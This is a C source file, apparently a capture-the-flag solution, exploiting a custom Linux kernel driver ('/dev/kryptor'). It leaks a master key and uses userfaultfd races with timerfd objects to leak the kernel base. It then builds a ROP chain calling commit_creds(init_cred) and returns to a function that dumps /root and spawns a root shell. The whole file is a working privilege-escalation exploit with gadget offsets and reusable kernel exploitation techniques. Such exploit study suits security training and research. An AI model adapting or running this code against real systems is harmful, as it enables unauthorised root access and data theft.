#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <signal.h>
#define DEBUG
#include "userfault.h"

#define PAGE_SIZE 0x1000

#ifdef DEBUG

#define logOK(msg, ...)     dprintf(STDERR_FILENO,"[+] " msg "\n", ##__VA_ARGS__)

#define logInfo(msg, ...)   dprintf(STDERR_FILENO,"[!] " msg "\n", ##__VA_ARGS__)

#define logErr(msg, ...)    dprintf(STDERR_FILENO,"[-] " msg "\n", ##__VA_ARGS__)

#define errExit(msg, ...)   do{ dprintf(STDERR_FILENO,"[-] " msg " ", ##__VA_ARGS__) ; perror("") ; exit(-1) ; }while(0)

#define WAIT()              do { write(STDERR_FILENO, "[WAITTING ...]\n" ,16); getchar() ;} while(0)

#else

#define logOK(...) do{}while(0)
#define logInfo(...) do{}while(0)
#define logErr(...) do{}while(0)
#define errExit(...) do{}while(0)

#endif

#define devfile "/dev/kryptor"

int devfd;

void opendev(){
    devfd = open(devfile,O_RDWR);
    if(devfd < 0)
        errExit("open devfile");
}

#define CMD_ENCRYPT 0xEEEEEEEE
#define CMD_DECRYPT 0xDDDDDDDD
#define CMD_DELETE  0xFFFFFFFF

struct user_req{
    uint64_t idx;
    char* data;
    char* auth;
};
unsigned char name[0x20] = "\x55\x1a\x14" ;

int encrypt(const char* data){
    struct user_req req = {0};
    req.auth = name;
    req.data = (char *)data;
    return ioctl(devfd,CMD_ENCRYPT,&req);
}

int decrypt(uint64_t idx, char* data){
    struct user_req req = {0};
    req.auth = name;
    req.idx = idx;
    req.data = data;
    return ioctl(devfd,CMD_DECRYPT,&req);
}

int delete(uint64_t idx){
    struct user_req req = {0};
    req.auth = name;
    req.idx = idx;
    return ioctl(devfd,CMD_DELETE,&req);    
}

u_int64_t user_cs;
u_int64_t user_rflags;
u_int64_t user_sp;
u_int64_t user_ss;

void save_state(){
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
}

int timerfd;
struct itimerspec its;

char master_key[256];

ulong kbase;

void stage1(){
    logInfo("Executing stage1 ...");
    if(delete(1) < 0)
        errExit("delete");

    its.it_value.tv_sec = 0;

    timerfd = timerfd_create(CLOCK_REALTIME, 0);
    if(timerfd < 0){
            errExit("timerfd_create");
    }
    timerfd_settime(timerfd, 0, &its, 0);
    close(timerfd);


    logOK("Spray done!");
    logInfo("Stage1: done!");
    sleep(1);
}

void stage2(){
    logInfo("Executing stage2 ...");
    its.it_value.tv_sec = 100;

    if(delete(1) < 0)
        errExit("delete");

    timerfd = timerfd_create(CLOCK_REALTIME, 0);
    if(timerfd < 0){
            errExit("timerfd_create");
    }
    timerfd_settime(timerfd, 0, &its, 0);
    logInfo("Stage2: done!");

}

__attribute__((naked)) long long syscall_custom(long int  num, ...){
    asm volatile(
        "mov rax, rdi;"
        "mov rdi, rsi;"
        "mov rsi, rdx;"
        "mov rdx, rcx;"
        "mov r10, r8;"
        "syscall;"
        "ret;"
    );
}

int open_custom(const char* path, int flags){
    return syscall_custom(SYS_open,path,flags);
}

int stat_custom(const char* path,  struct stat* buf){
    return syscall_custom(SYS_stat,path,buf);
}

ssize_t write_custom(int fd, const void* buf, size_t size){
    return syscall_custom(SYS_write,fd,buf,size);
}

ssize_t read_custom(int fd, const void* buf, size_t size){
    return syscall_custom(SYS_read,fd,buf,size);
}

__attribute__ ((__noreturn__)) void win(){
    char buf[0x100];
    int stdin = open_custom("/dev/ttyS0", O_RDWR); // 0 
    int stdout = open_custom("/dev/ttyS0", O_RDWR); // 1
    int stderr = open_custom("/dev/ttyS0", O_RDWR); // 2

    write_custom(stdout, "[*]WIN\n", 7);
    
    ulong slowdown = 0x1000000;

    while(slowdown--){
        asm(
            "movq xmm0, xmm1;"
            "movq xmm1, xmm0;"
            "movq xmm2, xmm1;"
        );
    }

    while(slowdown++ < 0x1000000){
        asm(
            "movq xmm0, xmm1;"
            "movq xmm1, xmm0;"
            "movq xmm2, xmm1;"
        );
    }
    // Slow down

    read(stdin, buf, 2);

    system("ls -al /root/");
    system("cat /root/* ; echo THE_END ; sh");

    while(1){
        ;
    }
    asm("ud2;");
}

int main(int argc,char** argv,char** envp){
    save_state();    
    opendev();
    char* data0 = master_key;
    if(encrypt(data0) == -1){
        errExit("encrypt ");
    }
    logInfo("Add allocations[0] <- data0");

    if(decrypt(0,NULL) == 0)
        logErr("Can't trigger decrypt");
    logInfo("Triggered decrypt");
    
    if(decrypt(0,data0))
        errExit("Can't get master_key");

    logOK("Got master_key -> data0");

    for(uint64_t i = 0; i < 256 ; i++){
        dprintf(STDERR_FILENO,"%hhx",data0[i]);
    }
    write(2,"\n",1);

    sleep(1);
    
    char* data1 = calloc(1,256);

// Alloc
    if(encrypt(data1) == -1)
        errExit("encrypt data1");

 pthread_t th0, th1;

// Leak
#define PAGE_FAULT_ADDR_0 0x1337000ULL
    register_ufd(PAGE_FAULT_ADDR_0);
   
    pthread_create(&th0, NULL, race_userfault , stage1);


    if(decrypt(1, (char *)PAGE_FAULT_ADDR_0) == -1)
        errExit("decrypt data1");

    ulong* leaker = (ulong *)PAGE_FAULT_ADDR_0;

    ulong current_node = leaker[0x88/8]-0x88;
    ulong timerfd_tmrproc = leaker[5];

    logOK("Current_node = 0x%lx", leaker[0x88/8]-0x88);
    logOK("timerfd_tmrproc = 0x%lx", leaker[5]);
    kbase = leaker[5] - 0xf7c80;
    leaker[0] = current_node;

    sleep(1);

// Modify
#define PAGE_FAULT_ADDR_1 0x1338000ULL

// 0xffffffff81052ca5 : mov eax, [rdi] ; ret
// 0xffffffff81014775: add rax, rdi ; ret
// 0xffffffff8100006d: jmp rax
//0xffffffff8104c6be: xor eax, eax ; mov qword ptr [rdi], rsi ; ret
//0xffffffff81004e60 : pop rsi ; // ret
//0xffffffff8113790e: add [rcx] , eax ; ret
//0xffffffff81080aa3: pop rcx ; ret
//0xffffffff810c9f9d: pop r11 ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret ;

    memcpy(uf_buffer,(void *)PAGE_FAULT_ADDR_0,PAGE_SIZE);
    ulong* modify = (ulong *)uf_buffer;
    modify[5] = 0xffffffff81126958  - 0xffffffff81000000 + kbase ; //  push rdi ; adc byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret ;
    modify[0] = modify[4] = kbase+0x12695f; // pop r14; pop r15; pop rbp ; ret
    ulong* rop = &modify[8];
    ulong off = 0;

#define RDI_RET kbase + 0x14780c
#define RSI_RET kbase + 0x4e60
#define AAW(ptr, data) \
    rop[off++] = RDI_RET; \
    rop[off++] = ptr; \
    rop[off++] = RSI_RET ; \
    rop[off++] = data; \
    rop[off++] = kbase + 0x4c6be ; // xor eax, eax ; mov qword ptr [rdi], rsi ; ret

///..................

    rop[off++] = RDI_RET;
    rop[off++] = 0xffffffff816a3cf4 - 0xffffffff81000000 + kbase; // __ksymtab_commit_creds
    rop[off++] = 0xffffffff81052ca5 - 0xffffffff81000000 + kbase;// mov eax, [rdi] ; ret
    

    rop[off++] = RDI_RET; // pop rdi ; ret
    rop[off++] = 0xffffffff818385c0 - 0xffffffff81000000 + kbase; // init_cred

    rop[off++] = 0xffffffff81080aa3 - 0xffffffff81000000 + kbase; // pop rcx ; ret

    rop[off++] = current_node+16*8;

    rop[off++] = 0xffffffff8113790e - 0xffffffff81000000 + kbase; // add [rcx] , eax ; ret

    rop[off++] = 0xffffffff816a3cf4 - 0xffffffff81000000 + kbase; // __ksymtab_commit_creds

    AAW(current_node+5*8, RSI_RET+1);

    rop[off++] = 0xffffffff81200cc6 - 0xffffffff81000000 + kbase;
    rop[off++] = 0;
    rop[off++] = 0;
    rop[off++] = (uint64_t)win;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
    rop[off++] = user_sp;
    rop[off++] = user_ss;

    for(uint ix = 0 ; ix < 256 ; ++ix){
        uf_buffer[ix] ^= master_key[ix];
    }

    register_ufd(PAGE_FAULT_ADDR_1);
    pthread_create(&th1, NULL, race_userfault , stage2);

    if(encrypt((const char* )PAGE_FAULT_ADDR_1) == -1){
        errExit(":(");
    }

    while(1){
        ;
    }

}